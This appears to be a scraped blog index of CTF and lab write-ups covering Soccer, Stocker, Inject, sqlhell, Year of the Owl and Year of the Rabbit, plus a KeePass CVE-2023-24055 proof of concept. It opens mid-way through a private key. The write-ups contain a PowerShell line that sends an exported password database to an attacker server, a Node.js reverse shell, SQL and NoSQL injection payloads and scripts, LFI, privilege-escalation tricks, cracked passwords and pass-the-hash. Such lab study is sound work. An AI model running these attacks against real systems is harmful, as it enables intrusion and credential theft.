pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU&#x2F;dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM&#x2F;ByDd0kNWa&#x2F;c&#x2F;&#x2F;MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN&#x2F;N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY----- Johnssh2john id_rsa > id_rsa_hash john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa_hash SSHchmod +600 id_rsa ssh barry@10.10.132.178 -i id_rsa LSEscp -i id_rsa lse.sh barry@10.10.132.178:/tmp/lse.sh Strings on it.It’s using tail. Privilege escalationhttps://infosecwriteups.com/understand-privilege-escalation-by-abusing-linux-access-control-6cab107e7203 https://www.pentestpartners.com/security-blog/exploiting-suid-executables/ cd /tmp PATH=.:$PATH echo \"/bin/bash\" > tail /home/joe/live_log","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF socker","slug":"CTF socker","date":"2023-04-13T04:15:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/CTF socker.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20socker.html","excerpt":"","text":"Rustscanrustscan -a soccer.htb Output: PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 9091/tcp open xmltec-xmlmail syn-ack Port 9091 Port 80Gobusterffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H \"Host: FUZZ.soccer.htb\" -u http://soccer.htb Output: &#x2F;index.html (Status: 200) [Size: 6917] &#x2F;.html (Status: 403) [Size: 162] &#x2F;tiny (Status: 301) [Size: 178] [--&gt; http:&#x2F;&#x2F;soccer.htb&#x2F;tiny&#x2F;] I found a RCE.https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.shLet’s follow the exemple…And it’s the good password, but the exploit is not working. User: adminPassword: admin@123 Revershell Upgrade the shellpython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm # allow clear command Then Ctrl + Z. stty raw -echo; fg # allow auto completion lse.sh[!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;local&#x2F;bin&#x2F;doas [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst080 Can we read subdirectories under &#x2F;home?......................... yes! /etc/passwdlxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false player:x:1001:1001::&#x2F;home&#x2F;player:&#x2F;bin&#x2F;bash mysql:x:113:121:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false _laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false Linpease╔══════════╣ CVEs Check Vulnerable to CVE-2021-3560 Potentially Vulnerable to CVE-2022-2588 ╔══════════╣ Checking doas.conf permit nopass player as root cmd &#x2F;usr&#x2F;bin&#x2F;dstat cat /etc/nginx/sites-enabled/* Output: # We already know this one server_name soccer.htb; server_name soc-player.soccer.htb; root &#x2F;root&#x2F;app&#x2F;views; I need to add soc-player.soccer.htb to my /etc/hosts.It’s an another website, interesting.The root is in /root/app/views, maybe I can be root with this one. I’ve created an account.I have the ticker number 85240.It’s using this script to connect: &lt;script> var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\"); window.onload = function () &#123; var btn = document.getElementById('btn'); var input = document.getElementById('id'); ws.onopen = function (e) &#123; console.log('connected to the server') &#125; input.addEventListener('keypress', (e) => &#123; keyOne(e) &#125;); function keyOne(e) &#123; e.stopPropagation(); if (e.keyCode === 13) &#123; e.preventDefault(); sendText(); &#125; &#125; function sendText() &#123; var msg = input.value; if (msg.length > 0) &#123; ws.send(JSON.stringify(&#123; \"id\": msg &#125;)) &#125; else append(\"????????\") &#125; &#125; ws.onmessage = function (e) &#123; append(e.data) &#125; function append(msg) &#123; let p = document.querySelector(\"p\"); // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16); // p.style.color = randomColor; p.textContent = msg &#125; &lt;/script> var ws = new WebSocket(“ws://soc-player.soccer.htb:9091”);It’s not working via http, it’s a websocket. sqlmap -u “http://localhost:8081/?id=1&quot; -p “id” –dbs –dbms=mysql sqlmap -u “http://localhost:8081/?id=1&quot; -p “id” -D soccer_db –tables –dbms=mysql sqlmap -u “http://localhost:8081/?id=1&quot; -p “id” -D soccer_db -T accounts –dump –dbms=mysqlUser: playerPassword: doas -u root /usr/bin/dstat –cyberw1ng SSH EscalationAs we saw with lipease, wt can run this as root: doas /usr/bin/dstat https://gtfobins.github.io/gtfobins/dstat/dstat allows you to run arbitrary python scripts loaded as “external plugins” if they are located in one of the directories stated in the dstat man page under “FILES”: echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py doas -u root /usr/bin/dstat --xxx","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CVE-2023-24055 KeePass 2.5x","slug":"CVE-2023-24055 KeePass 2.5x","date":"2023-04-12T15:11:29.893Z","updated":"2023-04-12T15:11:29.893Z","comments":true,"path":"/post/CVE-2023-24055 KeePass 2.5x.html","link":"","permalink":"https://peanutstick.github.io/post/CVE-2023-24055%20KeePass%202.5x.html","excerpt":"","text":"I’m not the author of this POC.https://github.com/alt3kx/CVE-2023-24055_PoC Connect to the targetShow directories. smbclient -L //192.168.1.182 Connect to shared directory. smbclient \\\\\\\\192.168.1.182\\\\Roaming Download the configget KeePass\\KeePass.config.xml This is how looks like the file. Add a triggerThe POC: &lt;Triggers> &lt;Trigger> &lt;Guid>lztpSRd56EuYtwwqntH7TQ==&lt;/Guid> &lt;Name>exploit&lt;/Name> &lt;Events> &lt;Event> &lt;TypeGuid>s6j9/ngTSmqcXdW6hDqbjg==&lt;/TypeGuid> &lt;Parameters> &lt;Parameter>0&lt;/Parameter> &lt;Parameter /> &lt;/Parameters> &lt;/Event> &lt;/Events> &lt;Conditions /> &lt;Actions> &lt;Action> &lt;TypeGuid>D5prW87VRr65NO2xP5RIIg==&lt;/TypeGuid> &lt;Parameters> &lt;Parameter>c:\\Users\\John\\AppData\\Local\\Temp\\exploit.xml&lt;/Parameter> # This one &lt;Parameter>KeePass XML (2.x)&lt;/Parameter> &lt;Parameter /> &lt;Parameter /> &lt;/Parameters> &lt;/Action> &lt;Action> &lt;TypeGuid>2uX4OwcwTBOe7y66y27kxw==&lt;/TypeGuid> &lt;Parameters> &lt;Parameter>PowerShell.exe&lt;/Parameter> &lt;Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri http://attacker_server_here/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\\Users\\John\\AppData\\Local\\Temp\\exploit.xml'))) &lt;/Parameter> # And this one &lt;Parameter>False&lt;/Parameter> &lt;Parameter>1&lt;/Parameter> &lt;Parameter /> &lt;/Parameters> &lt;/Action> &lt;/Actions> &lt;/Trigger> &lt;/Triggers> I have to change 2 lines.The first one to replace by the user of the windows.The second for the same ting + give the address of the web server.This is my version: ... &lt;Parameters> &lt;Parameter>c:\\Users\\peanutstick\\AppData\\Local\\Temp\\exploit.xml&lt;/Parameter> # This one &lt;Parameter>KeePass XML (2.x)&lt;/Parameter> ... ... &lt;Parameter>PowerShell.exe&lt;/Parameter> &lt;Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri http://192.168.1.69:1337/exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\\Users\\peanutstick\\AppData\\Local\\Temp\\exploit.xml'))) &lt;/Parameter> # And this one &lt;Parameter>False&lt;/Parameter> ... Put it back in the target. Create a web serverWe need a web server where we can user PUT method.This one is good:https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7Now we have to open it and wait, the windows user need to save a new password And Voila, with the file in base 64 Decodeecho \"string\" | base64 -d > passwords.txt","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://peanutstick.github.io/tags/CVE/"}]},{"title":"CTF Year of the Rabbit","slug":"CTF Year of the Rabbit","date":"2023-04-12T14:14:27.271Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/CTF Year of the Rabbit.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Year%20of%20the%20Rabbit.html","excerpt":"","text":"rustscanrustscan -a 10.10.101.203 PORT STATE SERVICE REASON21/tcp open ftp syn-ack22/tcp open ssh syn-ack80/tcp open http syn-ack gobustergobuster dir -u http://10.10.101.203 -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Inside style.css: sup3r_s3cr3t_fl4g.php I’m forced to watch it.He say, your looking at the wrong place.So open burpsuit: http://10.10.101.203/WExYY2Cv-qU/ is the hiden directory. This is the picture: I donwload it and do a strings on it. We have a user with lot of passwords, let’s try them with hydra. Crack FTPuser: ftpuser hydra -l ftpuser -P passwords.txt ftp://10.10.101.203 -V password: 5iez1wGXKfPKQ Connect to ftp File: Eli’s_Creds.txt Brainfuckhttps://www.dcode.fr/brainfuck-language User: eliPassword: DSpDiM1wAEwid SSH Gwendoline is a user ?I don’t have the time to to the rest. I’m going back to work in few minutes. But I saw this file who can be interesing: I will continue later.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"steganography","slug":"steganography","permalink":"https://peanutstick.github.io/tags/steganography/"}]},{"title":"CTF sqlhell","slug":"sqlhell","date":"2023-04-10T18:14:00.000Z","updated":"2023-04-25T15:21:16.513Z","comments":true,"path":"/post/sqlhell.html","link":"","permalink":"https://peanutstick.github.io/post/sqlhell.html","excerpt":"","text":"import requests Base_URL=\"http://10.10.237.91/post?id=2 AND 1=1\" with open('payload.txt') as topo_file: for line in topo_file: r = requests.get(Base_URL+line) t = r.elapsed.total_seconds() print(str(len(r.content)+t)+\" \"+Base_URL+line) Flag 1admin' or '1'='1 Flag 2 http://10.10.237.91/terms-and-conditionshttps://stackoverflow.com/questions/3003145/how-to-get-the-client-ip-address-in-php This means that if you are going to save the &#96;$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]&#96;, make sure you _also_ save the &#96;$_SERVER[&#39;REMOTE_ADDR&#39;]&#96; value. E.g. by saving both values in different fields in your database. https://outpost24.com/blog/X-forwarded-for-SQL-injection curl --header \"X-Forwarded-For: 192.168.0.2\" 'http://10.10.237.91/terms-and-conditions' Code it to try every payloads import requests Base_URL=\"http://10.10.149.83/terms-and-conditions\" with open('Time_based.txt') as topo_file: for line in topo_file: headers=&#123;'X-Forwarded-For':f\"1 '\"+str(line.rstrip())&#125; r = requests.get(Base_URL,headers=headers) t = r.elapsed.total_seconds() print(str(len(r.content))+\" : \"+str(t)+\" \"+Base_URL+str(headers)) Got 2 valid payloads. http:&#x2F;&#x2F;10.10.149.83&#x2F;terms-and-conditions&#123;&#39;X-Forwarded-For&#39;: &quot;1 &#39;AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#39;vRxe&#39;&#x3D;&#39;vRxe&quot;&#125; http:&#x2F;&#x2F;10.10.149.83&#x2F;terms-and-conditions&#123;&#39;X-Forwarded-For&#39;: &quot;1 &#39;AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#&quot;&#125; In curl: curl -o /dev/null -s -w 'Total: %&#123;time_total&#125;s\\n' -H \"X-Forwarded-For: 1 'AND (SELECT * FROM (SELECT SLEEP(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '84')nQIP)#\" http://10.10.149.83/terms-and-conditions AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '84'); --+\" http://sqhell.thm Found the right payload: curl -o /dev/null -s -w 'Total: %&#123;time_total&#125;s\\n' -H \"X-Forwarded-For: 1 'AND (SELECT * FROM (SELECT SLEEP(1) FROM flag where (ASCII(SUBSTR(flag,1,1))) >= '1')nQIP)#\" http://10.10.149.83/terms-and-conditions Total: 1.067626s the script:#!/bin/bash flag=\"\" for l in &#123;1..45&#125; do for i in &#123;1..127&#125; do r=$(curl -o /dev/null -s -w 'Total: %&#123;time_total&#125;s\\n' -H \"X-Forwarded-For: 1 'AND (SELECT * FROM (SELECT SLEEP(1) FROM flag where (ASCII(SUBSTR(flag,$l,1))) = '$i')nQIP)#\" http://10.10.149.83/terms-and-conditions) if [[ $r == *\"1.\"* ]]; then flag+=$(echo -e $(printf '\\\\x%02x' $i)) #flag+=$letter break fi done echo $flag done Flag 3http://10.10.237.91/register So it’s a Blind Boolean SQLI Database lengthhttps://defendtheweb.net/article/blind-sql-injectionadmin' AND (SELECT LENGTH(database()))=8;-- Database nameadmin' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))>=115;-- 155=sRemember, is the user is taken it’s mean we are good. 113=q104=h101=e108=l108=l95=_51=3We have the 8 chars: sqhell_3 Get table nameThis is the payload, I had to replace database() by (select table_name from information_schema.tables where table_schema=database() limit 0,1)So… I think the first step was uselessadmin&#39; AND (SELECT ASCII(SUBSTRING((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1), 1, 1)))&gt;&#x3D;102;-- 102=f108=l97=a103=gThe last request for the g:admin&#39; AND (SELECT ASCII(SUBSTRING((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1), 4, 1)))&#x3D;103;-- Get column nameadmin&#39; AND (SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name&#x3D;&quot;user&quot; LIMIT 1,1), 1, 1)))&#x3D;102;-- So the first char is fthe second char is a 102=f108=l97=a103=g Get table contentIt will take so much time…admin&#39; AND (SELECT ASCII(SUBSTRING((SELECT flag FROM sqhell_3.flag limit 0,1), 1, 1)))&#x3D;84;-- I will script it, need to find a way to use the script directly, to be able to inject in the URL. http:&#x2F;&#x2F;10.10.237.91&#x2F;register&#x2F;user-check?username&#x3D;admin%27%20AND%20(SELECT%20ASCII(SUBSTRING((SELECT%20flag%20FROM%20sqhell_3.flag%20limit%200,1),%201,%201)))&#x3D;84;-- After few minutes: #!/bin/bash flag=\"\" for l in &#123;1..45&#125; do for i in &#123;1..127&#125; do r=$(curl -s \"http://10.10.237.91/register/user-check?username=admin%27%20AND%20(SELECT%20ASCII(SUBSTRING((SELECT%20flag%20FROM%20sqhell_3.flag%20limit%200,1),%20$l,%201)))=$i;--\") if [[ $r == *\"false\"* ]]; then flag+=$(echo -e $(printf '\\\\x%02x' $i)) break fi done echo $flag done Flag 4http://10.10.59.204/user?id=1 order by 1,2,3,4 So there is 3 columns. http://10.10.59.204/user?id=0 union select 1,2,3 http://10.10.59.204/user?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() Flag 5There is 4 columnsif I put 1,2,3 or 1,2,3,4,5 I have an error. http://10.10.237.91/post?id=99 AND 1=1 UNION ALL SELECT 1,2,3,4 Get the database name:But we want to know the right colum to inject the code. http://10.10.237.91/post?id=99 AND 1=1 UNION ALL SELECT 1,2,database(),4 Get the table: http://10.10.237.91/post?id=99 AND 1=1 UNION ALL SELECT 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database() Get The table content: http://10.10.237.91/post?id=99 AND 1=1 UNION select 1,2,flag,4 from flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://peanutstick.github.io/tags/sql/"}]},{"title":"CTF inject","slug":"Inject","date":"2023-04-05T01:20:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/Inject.html","link":"","permalink":"https://peanutstick.github.io/post/Inject.html","excerpt":"","text":"/etc/hosts nmapnmap -sV -vvv -p- inject.htb -sC feroxbusterferoxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://inject.htb:8080 http://inject.htb:8080/release_notes http://inject.htb:8080/uploadI intercept it with burpsuit. Let’s try other extentions: _php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_ It’s uploading but not executing the php code. fuzzing for LFIhttp://inject.htb:8080/show_image?img=../../../../../../../etc/passwdI’ve tried to fuzz it. ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u 'http://inject.htb:8080/show_image?img=FUZZ' -fc 500 But I have nothing interesting. LFI in GETReplace the POST by GET and the image by the directory.Now let’s browse into the home directory.There is 2 users, but we can only browse into frank directory.philDocPhillovestoInject123 It’s not working with SSH. springframework &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt; &lt;version&gt;2.6.5&lt;&#x2F;version&gt; &lt;relativePath&#x2F;&gt; &lt;!-- lookup parent from repository --&gt; &lt;&#x2F;parent&gt; We have the version and the name of the framework.2.6.5https://codetinkering.com/spring4shell-vulnerability-fix/The CVE-2022-22965 is not workingIt should be the CVE-2022-22963Let’s execute it. Lateral movementI have a shell, now we can try to reuse the creds.Now I will upgrade my shell. python3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm # allow clear command Then Ctrl + Z. stty raw -echo; fg # allow auto completion Now I use lse.sh:Juste google it to find the doc of ansible. https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/I found a task in /opt/ansible/tasks/, I was able to write in it. - hosts: localhost tasks: - name: Evil ansible.builtin.shell: | chmod +s /bin/bash become: true bash -p I’m root","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"lfi","slug":"lfi","permalink":"https://peanutstick.github.io/tags/lfi/"}]},{"title":"CTF inject","slug":"Stocker","date":"2023-04-05T01:20:00.000Z","updated":"2023-04-12T14:14:27.277Z","comments":true,"path":"/post/Stocker.html","link":"","permalink":"https://peanutstick.github.io/post/Stocker.html","excerpt":"","text":"/etc/hosts nmapnmap -sV -vvv -p- stocker.htb -sC stocker.htb websitehttp://stocker.htb NamesAngoose Garden Subdomainffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.stocker.htb\" -u http://stocker.htb -fs 178 Output: [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 76ms] * FUZZ: dev Add it to /etc/hosts feroxbusterstocker.htbferoxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://stocker.htb Nothing interesting. dev.stocker.htbferoxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.stocker.htb dev.stocker.htb websiteWe can’t determine if the user is valid or not. WappalyserInteresting things: Hugo 0.84 Express It’s always the same cookie: s%3AEkbF_uqspuca0DfXERWTzsf0cWG94GB0.2PuvtFQYtitfWmH51fsrOd8Mx86P0IoPxyRVhB6A41o Google: connect.sidhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express npm i @digital-interruption/cookie-monster I’ve lost lost of times on this one, it’s not working.I’ve tried admin, stocker, Garden, Angoose. Maybe that’s not what I should do. ./cookie-monster.js --cookie s%3AEkbF_uqspuca0DfXERWTzsf0cWG94GB0 --signature 2PuvtFQYtitfWmH51fsrOd8Mx86P0IoPxyRVhB6A41o -w /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Let’s go back to the website. Bypass login pagehttps://book.hacktricks.xyz/pentesting-web/login-bypass it’s accepting the json:it’s not working.https://book.hacktricks.xyz/pentesting-web/nosql-injection POST &#x2F;login HTTP&#x2F;1.1 Host: dev.stocker.htb User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;111.0 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8 Accept-Language: en-US,en;q&#x3D;0.5 Accept-Encoding: gzip, deflate Content-Type: application&#x2F;json Content-Length: 53 Origin: http:&#x2F;&#x2F;dev.stocker.htb Connection: close Referer: http:&#x2F;&#x2F;dev.stocker.htb&#x2F;login Cookie: connect.sid&#x3D;s%3AEkbF_uqspuca0DfXERWTzsf0cWG94GB0.2PuvtFQYtitfWmH51fsrOd8Mx86P0IoPxyRVhB6A41o Upgrade-Insecure-Requests: 1 &#123;&quot;username&quot;:&#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;&#125; It’s working with a nosql injection.Now If I add something to my basket I can generate a PDF.I’m too tired to continue, I will do it tommorow. manipulate the PDFWe can see the infos in json with burpsuit.So, we can manipulate the PDF with 3 values: title price amountThe PDF is created by Skia/PDF m108 Found something but it’s not working well, maybe I use it wrong:https://github.com/ziadanbari2021/exploit-CVE-2020-24815Let’s see the code to do it ourself.file it the file we want to read. \"title\":\"&lt;iframe src=file:////&#123;&#125;>\".format(file) Then he download the PDF:And convert it into text:So this is my request.And this is my PDF:Even with pdftotext it’s not perfect:I need to know the exact file I should read, we don’t know any users, but maybe we can read config files with creds, or modify the pyaload to execute an RCE. I found something to get a better view: \"title\":\"&lt;iframe width='1000' height='1000' src=file://///etc/passwd>\", User_laurel angoose Config file with credsThey use mongodb and expressI don’t really know what to search, I’m blind and slow. I have to fuzz it.I will see it the file exist when the len of the pdf if bigger than Content-Length: 31133Whit this: curl -I http://dev.stocker.htb/api/po/64304da8da348e3d8cd8fe5b Now to generate the PDF I will use this: curl -i -s -k -X $'POST' \\ -H $'Host: dev.stocker.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://dev.stocker.htb/stock' -H $'Content-Type: application/json' -H $'Content-Length: 242' -H $'Origin: http://dev.stocker.htb' -H $'Connection: close' \\ -b $'connect.sid=s%3Ahpp9xtDJh-22qPPIQMzkqYz472TQw5vR.IgUuc96nI2Df8%2BBOvwXUpYzNAT1Nuyc1yU%2FhRsFH9jI' \\ --data-binary $'&#123;\\\"basket\\\":[&#123;\\\"_id\\\":\\\"638f116eeb060210cbd83a93\\\",\\\"title\\\":\\\"&lt;iframe width=\\'1000\\' height=\\'1000\\' src=file://///etc/nginx/nginx.conf>\\\",\\\"description\\\":\\\"It\\'s toilet paper.\\\",\\\"image\\\":\\\"toilet-paper.jpg\\\",\\\"price\\\":0.69,\\\"currentStock\\\":4212,\\\"__v\\\":0,\\\"amount\\\":1&#125;]&#125;' \\ $'http://dev.stocker.htb/api/order' | tail +10 | cut -d \\\" -f 6 Ok, Ive done the fuzzer, he’s slower than me, seriously…I need to run every curl commands in backgroud to be faster. I will just continue by hand:it was a bad idea to read this file :/var/log/nginx/access.log /etc/nginx/nginx.confI need to see more !You just have to change the value of this: \"title\":\"&lt;iframe width='1000' height='2000' src=file:////etc/nginx/nginx.conf >\", But I have Internal Server Error each time so I need to decrease the size. We lhave the web directory, we need a file:https://blog.logrocket.com/creating-configuration-files-node-js-using-node-config/ Node-config supports many file extensions. At the time of publication, the current version of node-config (3.3.6) supports the following extensions: .json .json5 .hjson .yaml or .yml .coffee .js .cson .properties .toml .ts .xml /var/www/dev/index.js is present. &#x2F;&#x2F; TODO: Configure loading from dotenv for production const dbURI &#x3D; &quot;mongodb:&#x2F;&#x2F;dev:IHeardPassphrasesArePrettySecure@localhost&#x2F;dev?authSource&#x3D;admin&amp;w&#x3D;1&quot;; We have one password: IHeardPassphrasesArePrettySecureIt’s the password of angoose.We don’t have the rights on the files.The * mean everything, it need to be a JS file.So instead of puting a file I can put an another directory. sudo node /usr/local/scripts/../../../../../tmp/rs.js In /tmp/rs.jshttps://www.revshells.com/ (function()&#123; var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"sh\", []); var client = new net.Socket(); client.connect(4949, \"10.10.14.141\", function()&#123; client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); &#125;); return /a/; // Prevents the Node.js application from crashing &#125;)();","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"lfi","slug":"lfi","permalink":"https://peanutstick.github.io/tags/lfi/"}]},{"title":"CTF Year of the Owl","slug":"CTF Year of the Owl","date":"2023-03-25T09:15:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/CTF Year of the Owl.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Year%20of%20the%20Owl.html","excerpt":"","text":"rustscanrustscan -a 10.10.33.184 --ulimit 5000 PORT STATE SERVICE REASON 80&#x2F;tcp open http syn-ack 139&#x2F;tcp open netbios-ssn syn-ack 443&#x2F;tcp open https syn-ack 445&#x2F;tcp open microsoft-ds syn-ack 3389&#x2F;tcp open ms-wbt-server syn-ack 5985&#x2F;tcp open wsman syn-ack 47001&#x2F;tcp open winrm syn-ack SNMP SCANTo find the community. onesixtyone 10.10.33.184 -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt The community is openview. https://github.com/Kitsun3Sec/Pentest-Cheat-SheetsThis mib is used to get the users. snmpwalk -c openview -v1 10.10.33.184 1.3.6.1.4.1.77.1.2.25 Jareth smb crackNow we can crack the smb password with this user. crackmapexec smb 10.10.33.184 -u Jareth -p /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt sarah Browse the SMBsmbclient -L //10.10.33.184 -U Jareth There is nothing interesting. List smb sharespython /usr/bin/smbmap.py -R -u \"Jareth\" -p \"sarah\" -H 10.10.33.184 evil-winrmevil-winrm -u Jareth -p sarah -i 10.10.131.77 PrivescWe gonna use powerup.ps1. On linux: python -m http.server 8000 On windows: Invoke-WebRequest -Uri http://10.8.50.167:8000/powerup.ps1 -OutFile powerup.ps1 Checklist:https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation cd / cd 'C:$Recycle.Bin' C:\\$Recycle.Bin> dir -force Inside the directory:We donwload them.It was impossible to download them when they was in the recycle bin copy sam.bak \"C:/Users/Jareth/Documents/sam.bak\" copy system.bak \"C:/Users/Jareth/Documents/system.bak\" download sam.bak /tmp/sam.bak download system.bak /tmp/system.bak I’m moving them in my working directory. mv /tmp/*.bak . Dump the hashssecretsdump.py -sam sam.bak -system system.bak LOCAL Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b::: Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a::: Use the admin hashevil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.131.77 Yeah !","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://peanutstick.github.io/tags/Windows/"}]},{"title":"CTF Bugged","slug":"CTF Bugged","date":"2023-03-09T08:00:00.000Z","updated":"2023-04-12T14:14:27.257Z","comments":true,"path":"/post/CTF Bugged.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Bugged.html","excerpt":"","text":"NoteJohn was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are? nampnmap -A -sV -p- 10.10.85.233 Output: Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-07 19:03 CET Nmap scan report for 10.10.85.233 Host is up (0.034s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 1883&#x2F;tcp open mosquitto version 2.0.14 | mqtt-subscribe: | Topics and their most recent payloads: | $SYS&#x2F;broker&#x2F;messages&#x2F;received: 59 | patio&#x2F;lights: &#123;&quot;id&quot;:9498615153902037727,&quot;color&quot;:&quot;RED&quot;,&quot;status&quot;:&quot;OFF&quot;&#125; | 